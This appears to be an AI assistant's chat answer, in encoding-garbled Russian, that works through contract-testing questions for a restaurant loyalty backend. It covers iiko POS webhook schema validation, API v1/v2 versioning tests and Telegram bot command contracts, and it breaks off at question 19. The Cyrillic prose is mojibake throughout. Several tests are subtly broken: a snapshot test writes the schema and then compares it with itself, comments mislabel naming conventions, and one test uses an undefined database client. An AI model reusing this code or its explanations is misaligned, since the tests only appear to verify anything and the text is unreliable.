## **–ë–õ–û–ö 4: CONTRACT TESTING (5 –≤–æ–ø—Ä–æ—Å–æ–≤)**


***

### **16. POS Webhook Schema - contract tests?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** iiko –º–æ–∂–µ—Ç –∏–∑–º–µ–Ω–∏—Ç—å webhook schema –±–µ–∑ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏—è.

**–í–æ–ø—Ä–æ—Å:** –ö–∞–∫ –∑–∞—â–∏—Ç–∏—Ç—å—Å—è?

- A) –ù–∞–¥–µ—è—Ç—å—Å—è —á—Ç–æ –Ω–µ –∏–∑–º–µ–Ω—è—Ç
- B) Contract tests (Pact): –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ schema –Ω–µ –∏–∑–º–µ–Ω–∏–ª—Å—è
- C) B + automated alerts –µ—Å–ª–∏ schema –∏–∑–º–µ–Ω–∏–ª—Å—è
- D) C + backward compatibility layer (–ø–æ–¥–¥–µ—Ä–∂–∫–∞ —Å—Ç–∞—Ä—ã—Ö –≤–µ—Ä—Å–∏–π)

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- External APIs –º–µ–Ω—è—é—Ç—Å—è –±–µ–∑ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏—è
- Contract tests –ª–æ–≤—è—Ç breaking changes –¥–æ production
- Backward compatibility –∫—Ä–∏—Ç–∏—á–Ω–∞ –¥–ª—è –ø–ª–∞–≤–Ω–æ–π –º–∏–≥—Ä–∞—Ü–∏–∏

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/contract/pos-webhook.contract.spec.ts
import { Verifier } from '@pact-foundation/pact';
import * as path from 'path';

describe('POS Webhook Contract Tests', () => {
  // Schema for iiko Cloud API v2.0 webhook
  const iikoWebhookSchema = {
    type: 'object',
    required: ['orderId', 'organizationId', 'orderDate', 'orderSum'],
    properties: {
      orderId: { type: 'string', format: 'uuid' },
      organizationId: { type: 'string', format: 'uuid' },
      orderDate: { type: 'string', format: 'date-time' },
      orderSum: { type: 'number', minimum: 0 },
      customer: {
        type: 'object',
        properties: {
          phone: { type: 'string', pattern: '^\\+7\\d{10}$' },
          cardNumber: { type: 'string' },
          guestId: { type: 'string', format: 'uuid' },
        },
      },
      items: {
        type: 'array',
        items: {
          type: 'object',
          required: ['productId', 'productName', 'price', 'quantity', 'sum'],
          properties: {
            productId: { type: 'string', format: 'uuid' },
            productName: { type: 'string' },
            categoryId: { type: 'string', format: 'uuid' },
            categoryName: { type: 'string' },
            price: { type: 'number', minimum: 0 },
            quantity: { type: 'number', minimum: 1 },
            sum: { type: 'number', minimum: 0 },
          },
        },
      },
      payments: {
        type: 'array',
        items: {
          type: 'object',
          required: ['paymentType', 'sum'],
          properties: {
            paymentType: { 
              type: 'string',
              enum: ['CASH', 'CARD', 'ONLINE'],
            },
            sum: { type: 'number', minimum: 0 },
          },
        },
      },
      terminalGroupId: { type: 'string', format: 'uuid' },
      createdAt: { type: 'string', format: 'date-time' },
      closedAt: { type: 'string', format: 'date-time' },
    },
  };

  it('should validate iiko webhook against schema', () => {
    const Ajv = require('ajv');
    const ajv = new Ajv({ allErrors: true });
    
    const validate = ajv.compile(iikoWebhookSchema);

    // Valid webhook
    const validWebhook = {
      orderId: '550e8400-e29b-41d4-a716-446655440000',
      organizationId: '660e8400-e29b-41d4-a716-446655440001',
      orderDate: '2026-02-12T14:30:00Z',
      orderSum: 2850,
      customer: {
        phone: '+79991234567',
        cardNumber: '000001',
      },
      items: [
        {
          productId: '770e8400-e29b-41d4-a716-446655440002',
          productName: 'Burger',
          categoryId: '880e8400-e29b-41d4-a716-446655440003',
          categoryName: 'Main Dishes',
          price: 500,
          quantity: 2,
          sum: 1000,
        },
      ],
      payments: [
        { paymentType: 'CARD', sum: 2850 },
      ],
      terminalGroupId: '990e8400-e29b-41d4-a716-446655440004',
      createdAt: '2026-02-12T14:30:00Z',
      closedAt: '2026-02-12T14:35:00Z',
    };

    const valid = validate(validWebhook);
    expect(valid).toBe(true);
  });

  it('should detect schema violations', () => {
    const Ajv = require('ajv');
    const ajv = new Ajv({ allErrors: true });
    const validate = ajv.compile(iikoWebhookSchema);

    // Invalid: missing required field
    const invalidWebhook = {
      orderId: '550e8400-e29b-41d4-a716-446655440000',
      // organizationId: missing!
      orderDate: '2026-02-12T14:30:00Z',
      orderSum: 2850,
    };

    const valid = validate(invalidWebhook);
    expect(valid).toBe(false);
    expect(validate.errors).toContainEqual(
      expect.objectContaining({
        keyword: 'required',
        params: { missingProperty: 'organizationId' },
      })
    );
  });

  it('should detect type changes (breaking change)', () => {
    const Ajv = require('ajv');
    const ajv = new Ajv({ allErrors: true });
    const validate = ajv.compile(iikoWebhookSchema);

    // Invalid: orderSum is string instead of number
    const invalidWebhook = {
      orderId: '550e8400-e29b-41d4-a716-446655440000',
      organizationId: '660e8400-e29b-41d4-a716-446655440001',
      orderDate: '2026-02-12T14:30:00Z',
      orderSum: '2850', // ‚ùå String instead of number!
    };

    const valid = validate(invalidWebhook);
    expect(valid).toBe(false);
    expect(validate.errors).toContainEqual(
      expect.objectContaining({
        keyword: 'type',
        params: { type: 'number' },
      })
    );
  });

  // Backward compatibility layer
  it('should handle both v1 and v2 iiko webhooks', async () => {
    const adapter = app.get(IikoWebhookAdapter);

    // v1 webhook (legacy)
    const v1Webhook = {
      CheckId: 'CHK-123', // camelCase
      Amount: 2850,
      GuestPhone: '+79991234567',
      // ... v1 fields
    };

    // v2 webhook (new)
    const v2Webhook = {
      orderId: '550e8400-e29b-41d4-a716-446655440000', // snake_case
      orderSum: 2850,
      customer: {
        phone: '+79991234567',
      },
      // ... v2 fields
    };

    // Both should parse to standardized format
    const parsed1 = await adapter.parseWebhook(v1Webhook);
    const parsed2 = await adapter.parseWebhook(v2Webhook);

    expect(parsed1).toMatchObject({
      posCheckId: 'CHK-123',
      checkAmount: 2850,
      guestPhone: '+79991234567',
    });

    expect(parsed2).toMatchObject({
      posCheckId: '550e8400-e29b-41d4-a716-446655440000',
      checkAmount: 2850,
      guestPhone: '+79991234567',
    });
  });

  // Automated monitoring
  it('should save webhook schema snapshots', async () => {
    const fs = require('fs');
    const snapshotPath = path.join(__dirname, '../snapshots/iiko-webhook-schema.json');

    // Save current schema
    fs.writeFileSync(snapshotPath, JSON.stringify(iikoWebhookSchema, null, 2));

    // In CI/CD: compare with previous snapshot
    const previousSchema = JSON.parse(fs.readFileSync(snapshotPath, 'utf8'));

    expect(iikoWebhookSchema).toEqual(previousSchema);
    
    // If different, alert team
    // sendAlert('iiko webhook schema changed!');
  });
});
```

**package.json:**

```json
{
  "devDependencies": {
    "@pact-foundation/pact": "^12.0.0",
    "ajv": "^8.12.0"
  },
  "scripts": {
    "test:contract": "jest --testMatch='**/*.contract.spec.ts'",
    "test:contract:ci": "npm run test:contract && node scripts/check-schema-changes.js"
  }
}
```

**CI/CD script:**

```javascript
// scripts/check-schema-changes.js
const fs = require('fs');
const path = require('path');

const snapshotDir = path.join(__dirname, '../test/snapshots');
const schemas = fs.readdirSync(snapshotDir);

let hasChanges = false;

for (const schema of schemas) {
  const currentPath = path.join(snapshotDir, schema);
  const previousPath = path.join(snapshotDir, `previous-${schema}`);

  if (!fs.existsSync(previousPath)) {
    console.log(`‚úÖ New schema detected: ${schema}`);
    continue;
  }

  const current = fs.readFileSync(currentPath, 'utf8');
  const previous = fs.readFileSync(previousPath, 'utf8');

  if (current !== previous) {
    console.error(`‚ùå Schema changed: ${schema}`);
    hasChanges = true;

    // Send alert
    sendSlackAlert(`üö® POS webhook schema changed: ${schema}`);
  }
}

if (hasChanges) {
  process.exit(1); // Fail CI/CD
}

function sendSlackAlert(message) {
  // Slack webhook implementation
  console.log(`[ALERT] ${message}`);
}
```


***

–ü—Ä–æ–¥–æ–ª–∂–∞—é —Å –≤–æ–ø—Ä–æ—Å–∞–º–∏ **17-20** (–æ—Å—Ç–∞–ª—å–Ω—ã–µ Contract Testing)? üöÄ

---

# –ü—Ä–æ–¥–æ–ª–∂–∞–π

–ü—Ä–æ–¥–æ–ª–∂–∞—é! üöÄ

***

### **17. API Versioning - breaking changes?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** API v1 deprecated, –Ω—É–∂–Ω–æ –º–∏–≥—Ä–∏—Ä–æ–≤–∞—Ç—å –∫–ª–∏–µ–Ω—Ç–æ–≤ –Ω–∞ v2.

**–í–æ–ø—Ä–æ—Å:** –ö–∞–∫ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å?

- A) Unit tests –¥–ª—è v2
- B) Contract tests: v1 –∏ v2 –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç –æ–¥–∏–Ω–∞–∫–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ
- C) B + automated tests –¥–ª—è –æ–±—Ä–∞—Ç–Ω–æ–π —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏
- D) C + monitoring: —Å–∫–æ–ª—å–∫–æ –∫–ª–∏–µ–Ω—Ç–æ–≤ –µ—â—ë –Ω–∞ v1

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- API versioning = –∫—Ä–∏—Ç–∏—á–µ–Ω –¥–ª—è backward compatibility
- Monitoring –ø–æ–º–æ–≥–∞–µ—Ç –ø–ª–∞–Ω–∏—Ä–æ–≤–∞—Ç—å deprecation
- Contract tests –≥–∞—Ä–∞–Ω—Ç–∏—Ä—É—é—Ç —á—Ç–æ migration –±–µ–∑–æ–ø–∞—Å–Ω–∞

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/contract/api-versioning.contract.spec.ts
describe('API Versioning - Contract Tests', () => {
  let app: INestApplication;
  let prisma: PrismaClient;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
  });

  beforeEach(async () => {
    await prisma.guestCard.deleteMany();
    await prisma.user.deleteMany();

    // Seed test data
    await prisma.user.create({
      data: {
        id: 'user-1',
        phone: '+79991234567',
        role: 'GUEST',
        phoneVerified: true,
        guestProfile: {
          create: {
            firstName: '–ò–≤–∞–Ω',
            lastName: '–ò–≤–∞–Ω–æ–≤',
            birthDate: new Date('1990-01-15'),
          },
        },
        guestCards: {
          create: {
            id: 'card-1',
            tenantId: 'tenant-1',
            totalBalance: 1500,
            totalEarned: 3000,
            totalSpent: 25000,
            qrCode: 'qr-1.png',
            displayCode: '123456',
            status: 'ACTIVE',
          },
        },
      },
    });
  });

  afterAll(async () => {
    await app.close();
  });

  // Test: v1 and v2 return same data (backward compatibility)
  it('should return compatible data between v1 and v2', async () => {
    const token = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // v1 API response
    const v1Response = await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    // v2 API response
    const v2Response = await request(app.getHttpServer())
      .get('/api/v2/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    // v1 format (legacy)
    expect(v1Response.body).toMatchObject({
      balance: 1500,
      earned: 3000,
      spent: 25000,
      card_number: '123456', // snake_case
    });

    // v2 format (new - camelCase)
    expect(v2Response.body).toMatchObject({
      balance: 1500,
      earned: 3000,
      spent: 25000,
      cardNumber: '123456', // camelCase
      // Additional fields in v2
      qrCodeUrl: expect.stringContaining('qr-1.png'),
      status: 'ACTIVE',
    });

    // Core data should be same
    expect(v1Response.body.balance).toBe(v2Response.body.balance);
    expect(v1Response.body.earned).toBe(v2Response.body.earned);
    expect(v1Response.body.spent).toBe(v2Response.body.spent);
  });

  // Test: v2 accepts v1 request format (backward compatibility)
  it('should accept v1 request format in v2 endpoint', async () => {
    const adminToken = jwt.sign(
      { userId: 'admin-1', role: 'ADMIN', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // v1 request format (snake_case)
    const v1Request = {
      guest_phone: '+79998887766',
      first_name: '–ü–µ—Ç—Ä',
      last_name: '–ü–µ—Ç—Ä–æ–≤',
      birth_date: '1985-05-20',
    };

    // v2 should accept v1 format
    const response = await request(app.getHttpServer())
      .post('/api/v2/admin/guests')
      .set('Authorization', `Bearer ${adminToken}`)
      .send(v1Request)
      .expect(201);

    expect(response.body.phone).toBe('+79998887766');
    expect(response.body.firstName).toBe('–ü–µ—Ç—Ä');
  });

  // Test: v1 deprecated warning header
  it('should return deprecation warning for v1 endpoints', async () => {
    const token = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    // Check deprecation headers
    expect(response.headers['x-api-version']).toBe('v1');
    expect(response.headers['x-api-deprecated']).toBe('true');
    expect(response.headers['x-api-sunset']).toBe('2026-12-31'); // Deprecation date
    expect(response.headers['link']).toContain('/api/v2/guest/balance'); // Migration link
  });

  // Test: Breaking changes documented
  it('should document breaking changes between versions', async () => {
    const breakingChanges = {
      v1_to_v2: [
        {
          field: 'card_number',
          oldName: 'card_number',
          newName: 'cardNumber',
          type: 'renamed',
          migrationGuide: 'Use cardNumber instead of card_number',
        },
        {
          field: 'transactions',
          oldFormat: 'array',
          newFormat: 'paginated object',
          type: 'structure_changed',
          migrationGuide: 'Use pagination: { data: [], meta: { page, total } }',
        },
        {
          field: 'level',
          removed: true,
          type: 'removed',
          replacement: 'loyaltyLevel',
          migrationGuide: 'Use loyaltyLevel.name instead of level',
        },
      ],
    };

    // Test migration for each breaking change
    for (const change of breakingChanges.v1_to_v2) {
      if (change.type === 'renamed') {
        // Verify both old and new names work in v2 (backward compatibility)
        const token = jwt.sign(
          { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
          process.env.JWT_SECRET
        );

        const response = await request(app.getHttpServer())
          .get('/api/v2/guest/balance')
          .set('Authorization', `Bearer ${token}`)
          .expect(200);

        expect(response.body.cardNumber).toBe('123456'); // New name
        expect(response.body.card_number).toBe('123456'); // Old name still works
      }
    }
  });

  // Test: Monitor API version usage
  it('should track API version usage', async () => {
    const token = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // Make 5 requests to v1
    for (let i = 0; i < 5; i++) {
      await request(app.getHttpServer())
        .get('/api/v1/guest/balance')
        .set('Authorization', `Bearer ${token}`);
    }

    // Make 3 requests to v2
    for (let i = 0; i < 3; i++) {
      await request(app.getHttpServer())
        .get('/api/v2/guest/balance')
        .set('Authorization', `Bearer ${token}`);
    }

    // Check metrics
    const metrics = await request(app.getHttpServer())
      .get('/metrics')
      .expect(200);

    const metricsText = metrics.text;

    // Verify v1 usage tracked
    expect(metricsText).toContain('api_requests_total{version="v1",endpoint="/guest/balance"} 5');
    
    // Verify v2 usage tracked
    expect(metricsText).toContain('api_requests_total{version="v2",endpoint="/guest/balance"} 3');
  });

  // Test: Auto-redirect v1 to v2 (optional)
  it('should optionally redirect v1 to v2 with query param', async () => {
    const token = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // v1 with auto-upgrade header
    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .set('X-API-Auto-Upgrade', 'true')
      .expect(200);

    // Should return v2 format
    expect(response.body.cardNumber).toBe('123456'); // v2 camelCase
    expect(response.headers['x-api-version-used']).toBe('v2');
  });

  // Test: Version negotiation via Accept header
  it('should support version negotiation via Accept header', async () => {
    const token = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // Request specific version via Accept header
    const v1Response = await request(app.getHttpServer())
      .get('/api/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .set('Accept', 'application/vnd.max-loyalty.v1+json')
      .expect(200);

    expect(v1Response.body.card_number).toBe('123456'); // v1 format

    const v2Response = await request(app.getHttpServer())
      .get('/api/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .set('Accept', 'application/vnd.max-loyalty.v2+json')
      .expect(200);

    expect(v2Response.body.cardNumber).toBe('123456'); // v2 format
  });
});

// Monitoring dashboard query
describe('API Version Usage Dashboard', () => {
  it('should generate usage report', async () => {
    const report = await prisma.$queryRaw`
      SELECT 
        api_version,
        endpoint,
        COUNT(*) as request_count,
        COUNT(DISTINCT user_id) as unique_users
      FROM api_request_logs
      WHERE created_at >= NOW() - INTERVAL '7 days'
      GROUP BY api_version, endpoint
      ORDER BY request_count DESC
    `;

    console.table(report);

    // Example output:
    // ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
    // ‚îÇ version ‚îÇ endpoint       ‚îÇ request_count   ‚îÇ unique_users  ‚îÇ
    // ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
    // ‚îÇ v1      ‚îÇ /guest/balance ‚îÇ 15,234          ‚îÇ 1,523         ‚îÇ
    // ‚îÇ v2      ‚îÇ /guest/balance ‚îÇ 3,456           ‚îÇ 345           ‚îÇ
    // ‚îÇ v1      ‚îÇ /guest/history ‚îÇ 8,901           ‚îÇ 890           ‚îÇ
    // ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

    // Alert if v1 usage still high (> 30%)
    const v1Usage = report.filter(r => r.api_version === 'v1').reduce((sum, r) => sum + r.request_count, 0);
    const v2Usage = report.filter(r => r.api_version === 'v2').reduce((sum, r) => sum + r.request_count, 0);
    const totalUsage = v1Usage + v2Usage;
    const v1Percentage = (v1Usage / totalUsage) * 100;

    if (v1Percentage > 30) {
      console.warn(`‚ö†Ô∏è v1 API still used by ${v1Percentage.toFixed(1)}% of requests`);
    }
  });
});
```


***

### **18. Telegram Bot Commands - contract?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Telegram Bot –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –∫–æ–º–∞–Ω–¥—ã: /start, /balance, /history.

**–í–æ–ø—Ä–æ—Å:** Contract tests?

- A) Manual testing –∫–æ–º–∞–Ω–¥
- B) Automated tests: –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–º–∞–Ω–¥—É ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –æ—Ç–≤–µ—Ç
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å schema –æ—Ç–≤–µ—Ç–∞ (buttons, inline keyboard)
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ deprecated –∫–æ–º–∞–Ω–¥—ã –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç migration notice

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Telegram Bot = user-facing interface (critical for UX)
- Button schema changes = breaking changes
- Deprecated commands –Ω—É–∂–Ω–æ gracefully migrate

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/contract/telegram-bot.contract.spec.ts
describe('Telegram Bot Commands - Contract Tests', () => {
  let app: INestApplication;
  let bot: any;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    bot = app.get('TELEGRAM_BOT');
  });

  afterAll(async () => {
    await app.close();
  });

  // Contract: /start command
  describe('/start command contract', () => {
    const startCommandContract = {
      command: '/start',
      response: {
        text: expect.stringContaining('–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å'),
        reply_markup: {
          keyboard: [
            [{ text: 'üì± –û—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä', request_contact: true }],
          ],
          resize_keyboard: true,
          one_time_keyboard: true,
        },
      },
    };

    it('should match /start command contract', async () => {
      const response = await bot.handleUpdate({
        message: {
          from: { id: 123456, username: 'test_user' },
          text: '/start',
          chat: { id: 123456 },
        },
      });

      expect(response.text).toEqual(startCommandContract.response.text);
      expect(response.reply_markup).toEqual(startCommandContract.response.reply_markup);
    });
  });

  // Contract: /balance command
  describe('/balance command contract', () => {
    const balanceCommandContract = {
      command: '/balance',
      response: {
        text: expect.stringMatching(/–í–∞—à –±–∞–ª–∞–Ω—Å: \d+ –±–∞–ª–ª–æ–≤/),
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'üìä –ò—Å—Ç–æ—Ä–∏—è', callback_data: 'history' },
              { text: 'üéÅ –ê–∫—Ü–∏–∏', callback_data: 'promos' },
            ],
            [
              { text: 'üí≥ –ú–æ—è –∫–∞—Ä—Ç–∞', callback_data: 'card' },
            ],
          ],
        },
      },
    };

    it('should match /balance command contract', async () => {
      // Setup: create guest
      await prisma.user.create({
        data: {
          id: 'user-1',
          phone: '+79991234567',
          role: 'GUEST',
          phoneVerified: true,
          telegramId: '123456',
          guestProfile: { create: { firstName: '–ò–≤–∞–Ω' } },
          guestCards: {
            create: {
              id: 'card-1',
              tenantId: 'tenant-1',
              totalBalance: 1500,
              qrCode: 'qr-1.png',
              displayCode: '123456',
              status: 'ACTIVE',
            },
          },
        },
      });

      const response = await bot.handleUpdate({
        message: {
          from: { id: 123456 },
          text: '/balance',
          chat: { id: 123456 },
        },
      });

      expect(response.text).toMatch(balanceCommandContract.response.text);
      expect(response.reply_markup).toEqual(balanceCommandContract.response.reply_markup);
    });
  });

  // Contract: /history command with pagination
  describe('/history command contract', () => {
    const historyCommandContract = {
      command: '/history',
      response: {
        text: expect.stringContaining('–ò—Å—Ç–æ—Ä–∏—è –æ–ø–µ—Ä–∞—Ü–∏–π'),
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              { text: '‚óÄÔ∏è –ù–∞–∑–∞–¥', callback_data: 'history_page_0' },
              { text: '1/3', callback_data: 'history_current' },
              { text: '–í–ø–µ—Ä—ë–¥ ‚ñ∂Ô∏è', callback_data: 'history_page_2' },
            ],
          ],
        },
      },
    };

    it('should match /history command contract', async () => {
      // Setup: create transactions
      const guestCard = await prisma.guestCard.create({
        data: {
          id: 'card-1',
          userId: 'user-1',
          tenantId: 'tenant-1',
          totalBalance: 500,
          qrCode: 'qr-1',
          displayCode: '123456',
          status: 'ACTIVE',
        },
      });

      await prisma.ballTransaction.createMany({
        data: Array(30).fill(null).map((_, i) => ({
          id: `tx-${i}`,
          guestCardId: guestCard.id,
          amount: 100,
          source: 'POS_WEBHOOK',
          sourceId: `CHK-${i}`,
          status: 'COMPLETED',
          earnedAt: new Date(),
        })),
      });

      const response = await bot.handleUpdate({
        message: {
          from: { id: 123456 },
          text: '/history',
          chat: { id: 123456 },
        },
      });

      expect(response.text).toContain('–ò—Å—Ç–æ—Ä–∏—è –æ–ø–µ—Ä–∞—Ü–∏–π');
      expect(response.parse_mode).toBe('Markdown');
      expect(response.reply_markup.inline_keyboard[0]).toHaveLength(3); // Pagination buttons
    });
  });

  // Contract: Deprecated command with migration notice
  describe('deprecated /stats command', () => {
    it('should return migration notice for deprecated command', async () => {
      const response = await bot.handleUpdate({
        message: {
          from: { id: 123456 },
          text: '/stats', // Deprecated command
          chat: { id: 123456 },
        },
      });

      expect(response.text).toContain('–ö–æ–º–∞–Ω–¥–∞ /stats –±–æ–ª—å—à–µ –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è');
      expect(response.text).toContain('–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /balance');
      expect(response.reply_markup.inline_keyboard[0][0]).toMatchObject({
        text: 'üìä –ü–µ—Ä–µ–π—Ç–∏ –∫ –±–∞–ª–∞–Ω—Å—É',
        callback_data: 'migrate_to_balance',
      });
    });
  });

  // Contract: Error handling
  describe('error handling contract', () => {
    it('should return user-friendly error for unknown command', async () => {
      const response = await bot.handleUpdate({
        message: {
          from: { id: 123456 },
          text: '/unknown_command',
          chat: { id: 123456 },
        },
      });

      expect(response.text).toContain('–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞');
      expect(response.reply_markup.inline_keyboard).toContainEqual([
        { text: 'üì± –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', callback_data: 'main_menu' },
      ]);
    });

    it('should return error for unauthorized user', async () => {
      const response = await bot.handleUpdate({
        message: {
          from: { id: 999999 }, // Not registered
          text: '/balance',
          chat: { id: 999999 },
        },
      });

      expect(response.text).toContain('–í—ã –Ω–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω—ã');
      expect(response.reply_markup.inline_keyboard).toContainEqual([
        { text: 'üìù –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è', callback_data: 'register' },
      ]);
    });
  });

  // Contract: Inline keyboard callback data format
  describe('callback data format contract', () => {
    it('should use consistent callback_data format', async () => {
      const callbackDataFormats = [
        // Format: action
        { pattern: /^[a-z_]+$/, example: 'history', valid: true },
        
        // Format: action_param
        { pattern: /^[a-z_]+_[a-z0-9]+$/, example: 'history_page_2', valid: true },
        
        // Format: action_id_param
        { pattern: /^[a-z_]+_[a-f0-9-]+_[a-z0-9]+$/, example: 'promo_550e8400_view', valid: true },
      ];

      const response = await bot.handleUpdate({
        message: {
          from: { id: 123456 },
          text: '/balance',
          chat: { id: 123456 },
        },
      });

      // Validate all callback_data matches format
      const buttons = response.reply_markup.inline_keyboard.flat();
      
      for (const button of buttons) {
        const isValid = callbackDataFormats.some(format =>
          format.pattern.test(button.callback_data)
        );

        expect(isValid).toBe(true);
      }
    });
  });

  // Schema snapshot testing
  describe('command response schema snapshots', () => {
    it('should match saved snapshot for /start', async () => {
      const response = await bot.handleUpdate({
        message: {
          from: { id: 123456 },
          text: '/start',
          chat: { id: 123456 },
        },
      });

      const schema = {
        text: typeof response.text,
        reply_markup: {
          keyboard: response.reply_markup.keyboard.map(row =>
            row.map(btn => ({
              text: typeof btn.text,
              request_contact: typeof btn.request_contact,
            }))
          ),
        },
      };

      expect(schema).toMatchSnapshot();
    });
  });

  // Contract monitoring in production
  describe('contract violation monitoring', () => {
    it('should log contract violations', async () => {
      const logger = app.get('Logger');
      jest.spyOn(logger, 'warn');

      // Simulate response that violates contract
      const invalidResponse = {
        text: '–í–∞—à –±–∞–ª–∞–Ω—Å: 1500', // Missing " –±–∞–ª–ª–æ–≤" suffix
        reply_markup: {
          inline_keyboard: [], // Missing buttons
        },
      };

      // Validate against contract
      const expectedPattern = /–í–∞—à –±–∞–ª–∞–Ω—Å: \d+ –±–∞–ª–ª–æ–≤/;
      
      if (!expectedPattern.test(invalidResponse.text)) {
        logger.warn('Contract violation: /balance text format');
      }

      expect(logger.warn).toHaveBeenCalledWith(
        expect.stringContaining('Contract violation')
      );
    });
  });
});
```


***

### **19. External API Changes - –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Resend Email API –º–æ–∂–µ—Ç –∏–∑–º–µ–Ω–∏—Ç—å response format.

**–í–æ–ø—Ä–æ—Å:** –ö–∞–∫ –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å?

- A) –ù–∞–¥–µ—è—Ç—å—Å—è —á—Ç–æ –Ω–µ –∏–∑–º–µ–Ω—è—Ç
- B) Contract tests —Å actual API (–Ω–µ mock)
